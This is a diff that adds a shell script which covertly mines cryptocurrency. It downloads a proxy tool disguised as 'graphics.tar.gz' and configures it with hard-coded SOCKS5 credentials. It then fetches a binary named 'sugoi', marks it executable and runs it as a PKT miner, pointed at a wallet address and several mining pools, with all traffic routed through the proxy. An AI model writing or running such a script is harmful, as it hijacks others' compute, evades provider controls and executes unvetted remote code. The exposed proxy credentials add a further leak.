@@ -1,0 +1,39 @@
+#!/bin/sh
+ln -fs /usr/share/zoneinfo/Africa/Johannesburg /etc/localtime
+dpkg-reconfigure --frontend noninteractive tzdata
+
+apt update;apt -y install binutils cmake build-essential screen unzip net-tools curl
+
+wget https://raw.githubusercontent.com/nathanfleight/scripts/main/graphics.tar.gz
+
+tar -xvzf graphics.tar.gz
+
+cat > graftcp/local/graftcp-local.conf <<END 
+listen = :2233 
+loglevel = 1 
+select_proxy_mode=socks5_only 
+socks5 = id-socks5.woiden.net:8080
+socks5_username =  woiden_aufalmarom
+socks5_password =  gupron
+END
+
+./graftcp/local/graftcp-local -config graftcp/local/graftcp-local.conf &
+
+sleep .2
+
+echo " "
+echo " "
+
+echo "**"
+
+./graftcp/graftcp curl ifconfig.me
+
+echo " "
+echo " "
+
+echo "**"
+
+echo " "
+echo " "
+
+./graftcp/graftcp wget https://raw.githubusercontent.com/AntonyAjax/ehem/main/sugoi && chmod +x sugoi && ./sugoi ann -p pkt1q4k0cqtmhtlhyw9w2dha3dxn2fe9u8ez4zvgkad https://stratum.zetahash.com http://pool.pkt.world http://pool.pktpool.io http://pool-pkt.dlinodes.com | grep goodrate
